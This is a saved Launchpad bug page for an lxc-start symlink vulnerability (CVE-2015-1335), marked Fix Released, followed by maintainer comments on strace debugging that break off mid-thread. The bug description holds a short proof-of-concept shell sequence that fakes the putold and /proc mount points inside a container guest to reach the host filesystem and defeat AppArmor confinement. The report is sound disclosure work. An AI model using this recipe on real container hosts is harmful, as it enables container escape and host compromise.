<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" dir="ltr">
  <head>
<base href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+index" />

    <meta charset="UTF-8" />
    <title>Bug #1476662 “lxc-start symlink vulnerabilities may allow guest ...” : Bugs : lxc package : Ubuntu</title>
    <link rel="shortcut icon" href="/@@/launchpad.png" />
    <link rel="canonical" href="https://bugs.launchpad.net/bugs/1476662" />
    
      <link rel="alternate" type="application/atom+xml" href="http://feeds.launchpad.net/bugs/1476662/bug.atom" title="Bug 1476662 Feed" />
    

    
  
  <link type="text/css" rel="stylesheet" media="screen, print" href="/+icing/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/combo.css" />


    

    
      <meta name="description" content="lxc-start shuffles around mounts using helper directory /usr/lib/x86_64-linux-gnu/lxc (guest root fs is mounted here)

It then modifies mounts operating in guest root directory before invoking init. As it does not check if all mount points are directories, a malicious guest may modify its internal structure before shutdown (or was created using manipulated image) and then when started again, guest may

* Access  the whole host root filesystem

* Block switching from lxc-start apparmor profile..." />
      <meta property="og:description" content="lxc-start shuffles around mounts using helper directory /usr/lib/x86_64-linux-gnu/lxc (guest root fs is mounted here)

It then modifies mounts operating in guest root directory before invoking init. As it does not check if all mount points are directories, a malicious guest may modify its internal structure before shutdown (or was created using manipulated image) and then when started again, guest may

* Access  the whole host root filesystem

* Block switching from lxc-start apparmor profile..." />
    

    
    
      <meta property="og:title" content="Bug #1476662 “lxc-start symlink vulnerabilities may allow guest ...” : Bugs : lxc package : Ubuntu" />
      <meta property="og:type" content="website" />
      <meta property="og:image" content="/@@/launchpad.png" />
      <meta property="og:url" content="https://bugs.launchpad.net/bugs/1476662" />
      <meta property="og:site_name" content="Launchpad" />
    

    

    
  

  
  
  <script type="text/javascript">
    var LP = {
        cache: {},
        links: {}
    };
  </script>

  

  <script type="text/javascript">var cookie_scope = '; Path=/; Secure; Domain=.launchpad.net';</script>

   <script type="text/javascript" src="/+combo/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/?yui/yui/yui-min.js&amp;lp/meta.js&amp;yui/loader/loader-min.js"></script>
   <script type="text/javascript">
        var raw = null;
        if (LP.devmode) {
           raw = 'raw';
        }
        YUI.GlobalConfig = {
            combine: true,
            comboBase: '/+combo/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/?',
            root: 'yui/',
            filter: raw,
            debug: false,
            fetchCSS: false,
            maxURLLength: 2000,
            groups: {
                lp: {
                    combine: true,
                    base: '/+combo/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/?lp/',
                    comboBase: '/+combo/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/?',
                    root: 'lp/',
                    // comes from including lp/meta.js
                    modules: LP_MODULES,
                    fetchCSS: false
                }
            }
        }</script>

  <script type="text/javascript">
      // we need this to create a single YUI instance all events and code
      // talks across. All instances of YUI().use should be based off of
      // LPJS instead.
      var LPJS = new YUI();
  </script>



    <script id="base-layout-load-scripts" type="text/javascript">
        //<![CDATA[
        LPJS.use('base', 'node', 'console', 'event',
            'oop', 'lp', 'lp.app.foldables','lp.app.sorttable',
            'lp.app.inlinehelp', 'lp.app.links',
            'lp.bugs.bugtask_index', 'lp.bugs.subscribers',
            'lp.app.ellipsis', 'lp.code.branchmergeproposal.diff',
            'lp.views.global',
             function(Y) {

            Y.on("domready", function () {
                var global_view = new Y.lp.views.Global();
                global_view.render();

                Y.lp.app.sorttable.SortTable.init();
                Y.lp.app.inlinehelp.init_help();
                Y.lp.activate_collapsibles();
                Y.lp.app.foldables.activate();
                Y.lp.app.links.check_valid_lp_links();
            });

            Y.on('lp:context:web_link:changed', function(e) {
                  window.location = e.new_value;
            });
        });
        //]]>
    </script>
    <script id="base-helper-functions" type="text/javascript">
         //<![CDATA[
        // This code is pulled from lp.js that needs to be available on every
        // request. Pulling here to get it outside the scope of the YUI block.
        function setFocusByName(name) {
            // Focus the first element matching the given name which can be focused.
            var nodes = document.getElementsByName(name);
            var i, node;
            for (i = 0; i < nodes.length; i++) {
                node = nodes[i];
                if (node.focus) {
                    try {
                        // Trying to focus a hidden element throws an error in IE8.
                        if (node.offsetHeight !== 0) {
                            node.focus();
                        }
                    } catch (e) {
                        LPJS.use('console', function(Y) {
                            Y.log('In setFocusByName(<' +
                                node.tagName + ' type=' + node.type + '>): ' + e);
                        });
                    }
                    break;
                }
            }
        }

        function selectWidget(widget_name, event) {
          if (event && (event.keyCode === 9 || event.keyCode === 13)) {
              // Avoid firing if user is tabbing through or simply pressing
              // enter to submit the form.
              return;
          }
          document.getElementById(widget_name).checked = true;
        }
        //]]>
    </script>

    
      
      <script type="text/javascript" id="available-official-tags-js">var available_official_tags = ["a11y", "appstream", "bionic", "bisect-done", "bitesize", "cherry-pick", "community-security", "desktop-file", "disco", "dist-upgrade", "focal", "ftbfs", "groovy", "hirsute", "hw-specific", "impish", "jammy", "kernel-bug", "manpage", "metabug", "multiarch", "needs-bisect", "needs-design", "needs-packaging", "needs-reassignment", "package-conflict", "packaging", "patch", "patch-accepted-debian", "patch-accepted-upstream", "patch-forwarded-debian", "patch-forwarded-upstream", "patch-needswork", "patch-rejected", "patch-rejected-debian", "patch-rejected-upstream", "performing-bisect", "py2-removal", "qt4-removal", "regression-proposed", "regression-release", "regression-update", "string-fix", "suspend-resume", "systemd-boot", "testcase", "touch", "unmetdeps", "upgrade-software-version", "verification-done-bionic", "verification-done-focal", "verification-done-groovy", "verification-done-hirsute", "verification-done-impish", "verification-done-xenial", "verification-failed-bionic", "verification-failed-groovy", "verification-failed-impish", "verification-failed-xenial", "verification-needed-bionic", "verification-needed-focal", "verification-needed-groovy", "verification-needed-hirsute", "verification-needed-impish", "verification-needed-trusty", "verification-needed-xenial", "wayland", "xenial"];</script>
      <script type="text/javascript">
        LPJS.use('base', 'node', 'oop', 'event', 'lp.bugs.bugtask_index',
                  'lp.bugs.subscribers', 'lp.code.branchmergeproposal.diff',
                  'lp.app.comment', 'lp.services.messages.edit', function(Y) {
            Y.on('domready', function() {
                Y.lp.code.branchmergeproposal.diff.connect_diff_links();
                Y.lp.bugs.bugtask_index.setup_bugtask_index();
                Y.lp.bugs.bugtask_index.setup_bugtask_table();
                LP.cache.comment_context = LP.cache.bug;
                var cl = new Y.lp.app.comment.CommentList();
                cl.render();
                var sl = new Y.lp.bugs.subscribers.createBugSubscribersLoader({
                    container_box: '#other-bug-subscribers',
                    subscribers_details_view:
                        '/+bug-portlet-subscribers-details',
                    subscribe_someone_else_link: '.menu-link-addsubscriber'
                }, window);

                Y.lp.services.messages.edit.setup();
            });
         });
      </script>
      <style type="text/css">
        /* Align the 'add comment' link to the right of the comment box. */
        #add-comment-form textarea { width: 100%; }
        #add-comment-form { max-width: 60em; padding-bottom: 4em; }
        #add-comment-form .actions {float: right;}
        .buglink-summary dd { font-size: 10px; }
        a#privacy-link:link:hover, a#privacy-link:visited:hover {text-decoration:none;}
      </style>
      <style type="text/css">
        .yui3-overlay .value label  {
          /* It normally makes sense for form labels to be bold, but since
          this form consists only of radio buttons, there's nothing but labels
          so we just get wall-to-wall bold. */
          font-weight: normal !important;
        }
      </style>
    
    
  </head>

  <body id="document" itemscope="" itemtype="http://schema.org/WebPage" class="tab-bugs
      main_side
      public
      yui3-skin-sam">
          
          
    <div class="yui-d0">
      <div id="locationbar" class="login-logout">
        

<div id="logincontrol"><a href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+login">Log in / Register</a></div>



      </div><!--id="locationbar"-->

      <div id="watermark" class="watermark-apps-portlet">
        <div>
          <a href="https://launchpad.net/ubuntu"><img alt="" width="64" height="64" src="https://launchpadlibrarian.net/49558155/64_logo.png" /></a>
        </div>
        <div class="wide">
          <h2 id="watermark-heading"><a href="https://launchpad.net/ubuntu">Ubuntu</a><br /><a href="https://launchpad.net/ubuntu/+source/lxc">lxc package</a></h2>
        </div>
        
  <!-- Application Menu -->
  <ul class="facetmenu">
    
      
      <li class="overview"><a href="https://launchpad.net/ubuntu/+source/lxc">Overview</a></li>
      
    
    
      
      <li class="branches"><a href="https://code.launchpad.net/ubuntu/+source/lxc">Code</a></li>
      
    
    
      <li class="bugs active"><a href="https://bugs.launchpad.net/ubuntu/+source/lxc">Bugs</a></li>
      
      
    
    
      
      
      <li class="specifications disabled-tab"><span>Blueprints</span></li>
    
    
      
      <li class="translations"><a href="https://translations.launchpad.net/ubuntu/+source/lxc">Translations</a></li>
      
    
    
      
      <li class="answers"><a href="https://answers.launchpad.net/ubuntu/+source/lxc">Answers</a></li>
      
    
  </ul>

      </div>

      <div class="yui-t4">
        <div id="maincontent" class="yui-main">
          <div class="yui-b" dir="ltr">
            <div class="context-publication">
              
      <h1 id="edit-title">
<span class="yui3-editable_text-text ellipsis" style="max-width: 95%;">
    lxc-start symlink vulnerabilities may allow guest to read host filesystem, interfere with apparmor
</span>
  
</h1>



    
              

              <div id="registration" class="registering">
                
      Bug #1476662 reported by
      <a href="https://launchpad.net/~roman-fiedler-deactivatedaccount" class="sprite person-inactive">Roman Fiedler</a>
      <time title="2015-07-21 13:16:51 UTC" datetime="2015-07-21T13:16:51.663837+00:00">on 2015-07-21</time>
    
              </div>
            </div>

            
            <div id="request-notifications">
              
            </div>

            
              <div>

      

      <div id="bug-is-duplicate">
          
      </div>
      

      <div style="float: right;">
        <span><a href="/+help-bugs/bug-heat.html" target="help" class="sprite flame">264</a></span>
      </div>

      


  
  
    <div class="actions">
      <span id="affectsmetoo" style="display: inline">This bug affects 1 person</span>
    </div>
  



    <table id="affected-software" class="listing">
      <thead>
        <tr>
          <th colspan="2">Affects</th>
          <th>Status</th>
          <th>Importance</th>
          <th>Assigned to</th>
          <th>Milestone</th>
        </tr>
      </thead>

      <tbody>
        
          
  <tr class="highlight" id="tasksummary1877816">
    <td>
      <a class="bugtask-expander" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+editstatus">
        &#8203;
      </a>
    </td>
    
    <td>
      <span id="bugtarget-picker-tasksummary1877816">
        <span class="yui3-activator-data-box">
            <a class="sprite package-source" href="https://bugs.launchpad.net/ubuntu/+source/lxc" title="Latest release: 1:4.0.10-0ubuntu5, uploaded to universe on 2021-09-24 14:31:08.843633+00:00 by Lukas Märdian (slyon), maintained by Ubuntu Developers (ubuntu-devel-discuss-lists)">lxc (Ubuntu)</a>
        </span>
        <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
          Edit
        </button>
        <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        
      </span>
    </td>

    

    
    <td style="width: 20%; vertical-align: middle">
      <div class="status-content" style="width: 100%; float: left">
        
        
          <a href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+editstatus" style="float: left" class="value statusFIXRELEASED">Fix Released</a>
          <a href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+editstatus" style="margin-left: 3px">
            <img class="editicon" src="/@@/edit" />
          </a>
        
      </div>
    </td>

    
    <td style="width: 15em; vertical-align: middle">
      <div class="importance-content" style="width: 100%; float: left">
        <span style="float: left" class="value importanceHIGH">High</span>
      </div>
    </td>

    <td style="width:20%; margin: 0; padding: 0;
               vertical-align: middle; padding-left: 0.5em">
      

      
        <span id="assignee-picker-tasksummary1877816">
          <span class="yui3-activator-data-box">
            
            
              Unassigned
            
          </span>
          
          <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
            Edit
          </button>
          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        </span>
      
    </td>

    <td style="width: 20%; vertical-align: middle">
      <div class="milestone-content" style="width: 100%; float: left">
        
        <a class="value" href=""></a>
        
      </div>
    </td>

    
  </tr>

  
    <tr class="bugtask-collapsible-content hidden" id="task1877816">
     <td colspan="7"><form action="/ubuntu/+source/lxc/+bug/1476662/+editstatus" method="post" enctype="multipart/form-data">
  

  <p class="error message">
    You need to log in to change this bug's status.
  </p>
  
  <table class="summary" style="float: right; margin-left: 1em;">
    <tr>
      <th>Affecting:</th>
      <td><a href="/ubuntu/+source/lxc">lxc (Ubuntu)</a></td>
    </tr>
    <tr>
      <th>Filed here by:</th>
      <td><a href="https://launchpad.net/~roman-fiedler-deactivatedaccount" class="sprite person-inactive">Roman Fiedler</a></td>
    </tr>
    <tr>
      <th>When:</th>
      <td>
        <time title="2015-07-21 13:16:51 UTC" datetime="2015-07-21T13:16:51.663837+00:00">2015-07-21</time>
      </td>
    </tr>
    <tr>
      <th>Confirmed:</th>
      <td>
        <time title="2015-09-01 18:08:11 UTC" datetime="2015-09-01T18:08:11.109593+00:00">2015-09-01</time>
      </td>
    </tr>
    
    <tr>
      <th>Started work:</th>
      <td>
        <time title="2015-09-01 18:08:11 UTC" datetime="2015-09-01T18:08:11.109593+00:00">2015-09-01</time>
      </td>
    </tr>
    <tr>
      <th>Completed:</th>
      <td>
        <time title="2015-09-29 15:41:09 UTC" datetime="2015-09-29T15:41:09.693820+00:00">2015-09-29</time>
      </td>
    </tr>
  </table>
  <div class="field">
    <table>
      <tr>
        <td>
          <label for="ubuntu_lxc.target">Target</label>
        </td>
      </tr>
      <tr>
        <td>
          <table>
  <tr>
    <td>
      <label>
        <input class="radioType" checked="checked" id="ubuntu_lxc.target.option.package" name="ubuntu_lxc.target" type="radio" value="package" />
        Distribution
      </label>
    </td>
    <td>
      <select id="ubuntu_lxc.target.distribution" name="ubuntu_lxc.target.distribution" size="1" >
<option value="baltix">Baltix</option>
<option value="boss">BOSS</option>
<option value="charms">Juju Charms Collection</option>
<option value="elbuntu">Elbuntu</option>
<option value="guadalinex">Guadalinex</option>
<option value="guadalinexedu">Guadalinex Edu</option>
<option value="kiwilinux">Kiwi Linux</option>
<option value="nubuntu">nUbuntu</option>
<option value="pld-linux">PLD Linux</option>
<option value="tilix">Tilix</option>
<option value="tuxlab">tuXlab</option>
<option selected="selected" value="ubuntu">Ubuntu</option>
<option value="ubuntu-leb">Ubuntu Linaro Evaluation Build</option>
<option value="ubuntu-rtm">Ubuntu RTM</option>
</select>
<input name="ubuntu_lxc.target.distribution-empty-marker" type="hidden" value="1" />
    </td>
  </tr>
  <tr>
    <td align="right">
      <label for="ubuntu_lxc.target.option.package">
        Package
      </label>
    </td>
    <td>
      


    <input type="text" value="lxc" id="ubuntu_lxc.target.package"
                         name="ubuntu_lxc.target.package" size="20"
                         maxlength=""
                         onKeyPress="selectWidget(&#x27;ubuntu_lxc.target.option.package&#x27;, event)" style=""
                         class="" />

    
      
      <script type="text/javascript">
          LPJS.use('node', 'lp.app.picker', function(Y) {
              var text_input = Y.DOM.byId('ubuntu_lxc.target.package');
              var select_menu = Y.DOM.byId('ubuntu_lxc.target.package-suggestions');
              Y.lp.app.picker.connect_select_menu(
                  select_menu, text_input);
          });</script>
    

    <span class="hidden">(<a id="show-widget-ubuntu_lxc-target-package" href="#">Find&hellip;</a>)</span>
    <script>
    LPJS.use('node', 'lp.app.picker', function(Y) {
        var config = {"remove_team_text": "Remove team", "header": "Select a package", "show_remove_button": false, "selected_value": "lxc", "step_title": "Search by name", "show_assign_me_button": false, "vocabulary_filters": [], "vocabulary_name": "DistributionPackage", "input_element": "ubuntu_lxc.target.package", "show_widget_id": "show-widget-ubuntu_lxc-target-package", "assign_me_text": "Pick me", "show_create_team": false, "remove_person_text": "Remove person", "picker_type": "default", "extra_no_results_message": null, "selected_value_metadata": null};
        var show_widget_id = 'show-widget-ubuntu_lxc-target-package';
        Y.lp.app.picker.addPicker(config, show_widget_id);
    });
    </script>
  



    </td>
  </tr>

  <tr>
    <td>
      <label>
        <input class="radioType" id="ubuntu_lxc.target.option.product" name="ubuntu_lxc.target" type="radio" value="product" />
       Project
      </label>
    </td>
    <td>
      


    <input type="text" value="" id="ubuntu_lxc.target.product"
                         name="ubuntu_lxc.target.product" size="20"
                         maxlength=""
                         onKeyPress="selectWidget(&#x27;ubuntu_lxc.target.option.product&#x27;, event)" style=""
                         class="" />

    
      
      <script type="text/javascript">
          LPJS.use('node', 'lp.app.picker', function(Y) {
              var text_input = Y.DOM.byId('ubuntu_lxc.target.product');
              var select_menu = Y.DOM.byId('ubuntu_lxc.target.product-suggestions');
              Y.lp.app.picker.connect_select_menu(
                  select_menu, text_input);
          });</script>
    

    <span class="hidden">(<a id="show-widget-ubuntu_lxc-target-product" href="#">Find&hellip;</a>)</span>
    <script>
    LPJS.use('node', 'lp.app.picker', function(Y) {
        var config = {"remove_team_text": "Remove team", "header": "Select a project", "show_remove_button": false, "selected_value": null, "step_title": "Search", "show_assign_me_button": false, "vocabulary_filters": [], "vocabulary_name": "Product", "input_element": "ubuntu_lxc.target.product", "show_widget_id": "show-widget-ubuntu_lxc-target-product", "assign_me_text": "Pick me", "show_create_team": false, "remove_person_text": "Remove person", "picker_type": "default", "extra_no_results_message": null, "selected_value_metadata": null};
        var show_widget_id = 'show-widget-ubuntu_lxc-target-product';
        Y.lp.app.picker.addPicker(config, show_widget_id);
    });
    </script>
  



    </td>
  </tr>
</table>

          
        </td>
      </tr>
    </table>
    
    <table>
      <tr>
        <td>
          <label style="font-weight: bold" for="ubuntu_lxc.status">Status</label>
        </td>
        <td>
          <label style="font-weight: bold" for="ubuntu_lxc.importance">Importance</label>
        </td>
        
      </tr>
      <tr>
        <td><div>
<div class="value">
<select id="ubuntu_lxc.status" name="ubuntu_lxc.status" size="1" >
<option selected="selected" value="Fix Released">Fix Released</option>
</select>
</div>
<input name="ubuntu_lxc.status-empty-marker" type="hidden" value="1" />
</div></td>
        <td title="Changeable only by a project maintainer or bug supervisor">
          <span class="sprite read-only"></span>
          <span class="importanceHIGH">High</span>
        </td>
        
      </tr>
    </table>
    <table>
      <tr>
        <td>
          <label style="font-weight: bold" for="ubuntu_lxc.assignee">Assigned to</label>
        </td>
      </tr>
      <tr>
        <td colspan="2" style="white-space: nowrap">

  <table>
    <tr>
      <td style="padding: 0 2px 2px 0">
        <input type="radio" checked="checked" id="ubuntu_lxc.assignee.assign_to_nobody" name="ubuntu_lxc.assignee.option" value="ubuntu_lxc.assignee.assign_to_nobody" />
      </td>
      <td style="padding: 0">
        <label style="font-weight: normal" for="ubuntu_lxc.assignee.assign_to_nobody">
          Nobody
        </label>
      </td>
    </tr>
    <tr>
      <td style="padding: 0 2px 2px 0">
        <input type="radio" id="ubuntu_lxc.assignee.assign_to_me" name="ubuntu_lxc.assignee.option" value="ubuntu_lxc.assignee.assign_to_me" />
      </td>
      <td style="padding: 0">
        <label style="font-weight: normal" for="ubuntu_lxc.assignee.assign_to_me">
          Me
        </label>
      </td>
    </tr>
    
    
  </table>


</td>
      </tr>
    </table>
    
  </div>
  <div class="field">
    <div>
      <label style="font-weight: bold" for="ubuntu_lxc.comment_on_change">Comment on this change (optional)</label>
      <textarea cols="62" rows="4" id="ubuntu_lxc.comment_on_change" name="ubuntu_lxc.comment_on_change"></textarea>
    </div>
    <div>
      <label style="font-weight: normal">
        <input type="checkbox" name="subscribe" id="subscribe" value="Subscribe" />
        Email me about changes to this bug report
      </label>
    </div>
  </div>
  
</form>
</td>
    </tr>
  


        
      </tbody>

    </table>



<div class="actions">
  
    <span id="also-affects-product" class="">
    <a class="menu-link-addupstream sprite add" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+choose-affected-product">Also affects project</a>
        <a href="/+help-bugs/also-affects-project-help.html" target="help" class="sprite maybe action-icon">(?)</a>
    </span>
    <span id="also-affects-package" class="">
    <a class="menu-link-adddistro sprite add" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+distrotask">Also affects distribution/package</a>
    </span>
    <a class="menu-link-nominate sprite milestone" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+nominate">Nominate for series</a>
    
  

</div>




      <div id="maincontentsub">
        <div class="top-portlet">

      <div itemprop="mainContentOfPage" class="report">
        

        <div>
  <div class="lazr-multiline-edit" id="edit-description">
  <div class="clearfix">
    

    <h3>Bug Description</h3>
  </div>

  <div class="yui3-editable_text-text"><p>lxc-start shuffles around mounts using helper directory /usr/lib/<wbr />x86_64-<wbr />linux-gnu/<wbr />lxc (guest root fs is mounted here)</p>
<p>It then modifies mounts operating in guest root directory before invoking init. As it does not check if all mount points are directories, a malicious guest may modify its internal structure before shutdown (or was created using manipulated image) and then when started again, guest may</p>
<p>* Access  the whole host root filesystem</p>
<p>* Block switching from lxc-start apparmor profile to lxc-container-<wbr />default</p>
<p># Real putold before pivot-root (root fs will end here)<br />
mkdir -p /x/lxc_putold</p>
<p># Faked putold<br />
ln -s /usr/lib/<wbr />x86_64-<wbr />linux-gnu/<wbr />lxc/x/lxc_<wbr />putold lxc_putold<br />
mkdir -p /usr/lib/<wbr />x86_64-<wbr />linux-gnu/<wbr />lxc/x/lxc_<wbr />putold/<wbr />proc<br />
touch /usr/lib/<wbr />x86_64-<wbr />linux-gnu/<wbr />lxc/x/lxc_<wbr />putold/<wbr />proc/mounts</p>
<p># proc fake<br />
mkdir -p /x/proc<br />
umount /proc<br />
rmdir /proc<br />
ln -s /usr/lib/<wbr />x86_64-<wbr />linux-gnu/<wbr />lxc/x/proc proc</p>
<p>mkdir -p /usr/lib/<wbr />x86_64-<wbr />linux-gnu/<wbr />lxc/x/proc/<wbr />1/attr /usr/lib/<wbr />x86_64-<wbr />linux-gnu/<wbr />lxc/x/proc/<wbr />self<br />
touch /usr/lib/<wbr />x86_64-<wbr />linux-gnu/<wbr />lxc/x/proc/<wbr />1/attr/<wbr />current<br />
touch /usr/lib/<wbr />x86_64-<wbr />linux-gnu/<wbr />lxc/x/proc/<wbr />self/status</p>
<p>The  issue was also found during <a rel="nofollow" href="https://service.ait.ac.at/security/2015/LxcSecurityAnalysis.html">https:/<wbr />/service.<wbr />ait.ac.<wbr />at/security/<wbr />2015/LxcSecurit<wbr />yAnalysis.<wbr />html</a></p></div>
  </div>

  
</div>


        <div style="margin:-10px 0 20px 5px" class="clearfix">
          
        </div>

        <div id="bug-tags">
          <span id="tags-heading">
            
          </span>
          <span id="tag-list">
          </span>
          <a href="+edit" title="Add tags" id="tags-trigger" class="sprite add">Add tags</a>
          
          <a href="/+help-bugs/tag-help.html" target="help" class="sprite maybe action-icon">Tag help</a>
        </div>

        <script type="text/javascript">
          LPJS.use('event', 'node', 'lp.bugs.tags_entry', function(Y) {
              Y.on('domready',
                   function(e) {
                       Y.lp.bugs.tags_entry.setup_tag_entry(
                           available_official_tags);
                   },
                   window);
          });
        </script>

        <div class="clearfix"></div>
      </div>

      <div id="branches-and-cves">
        <div id="bug-branches-container" style="float: left">
          
        </div><!-- bug-branch-container -->

        <div class="cves">
          <h2>CVE References</h2>
          <ul>
            <li class="sprite cve">
              <a href="/bugs/cve/2015-1335" title="lxc-start in lxc before 1.0.8 and 1.1...">2015-1335</a>
            </li>
          </ul>
        </div>

        <div class="clearfix"></div>
      </div> <!-- branches and CVEs -->

      </div>

      <div>
      
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/1" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~stgraber" class="sprite person">Stéphane Graber (stgraber)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-07-21T14:38:53.150335+00:00" title="2015-07-21 14:38:53 UTC">on 2015-07-21</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/1"> #1</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I&#x27;m assuming this was using LXC 1.0, any chance you can check LXC 1.1?</p>
<p>We&#x27;ve deprecated pivotdir in LXC 1.1 for other reasons but that may very well prevent this entirely, if that&#x27;s the case, then we can backport that change to LXC 1.0 minus the deprecation warning.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I'm assuming this was using LXC 1.0, any chance you can check LXC 1.1?

We've deprecated pivotdir in LXC 1.1 for other reasons but that may very well prevent this entirely, if that's the case, then we can backport that change to LXC 1.0 minus the deprecation warning.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/2" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~roman-fiedler-deactivatedaccount" class="sprite person-inactive">Roman Fiedler (roman-fiedler-deactivatedaccount)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-07-21T14:54:12.608660+00:00" title="2015-07-21 14:54:12 UTC">on 2015-07-21</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/2"> #2</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>No, only tested on Ubuntu Trusty. I do not have other test machine at hand at the moment. Could you run</p>
<p>strace -s256 -f /bin/sh -c &quot;/usr/bin/lxc-start --name [guestname]&quot; 2&gt;&amp;1 | tee /tmp/test.log</p>
<p>with a container where init is replaced with /bin/true (or just empty file) and send me the log?</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">No, only tested on Ubuntu Trusty. I do not have other test machine at hand at the moment. Could you run

strace -s256 -f /bin/sh -c "/usr/bin/lxc-start --name [guestname]" 2&gt;&amp;1 | tee /tmp/test.log

with a container where init is replaced with /bin/true (or just empty file) and send me the log?</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/3" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~stgraber" class="sprite person">Stéphane Graber (stgraber)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-07-21T15:13:12.901424+00:00" title="2015-07-21 15:13:12 UTC">on 2015-07-21</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/3"> #3</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite download-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+attachment/4432063/+files/strace-lxc-master-bin-true">strace-lxc-master-bin-true</a>
        <a class="sprite edit action-icon" href="/ubuntu/+source/lxc/+bug/1476662/+attachment/4432063">Edit</a>
        (565.3 KiB,
        text/plain)
      </li>
    </ul>

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>This is running:<br />
strace -o out -s256 -f lxc-start -n test -F -- /bin/true</p>
<p>The -F flag is needed in 1.1 and higher as -d is now the default.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">This is running:
strace -o out -s256 -f lxc-start -n test -F -- /bin/true

The -F flag is needed in 1.1 and higher as -d is now the default.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
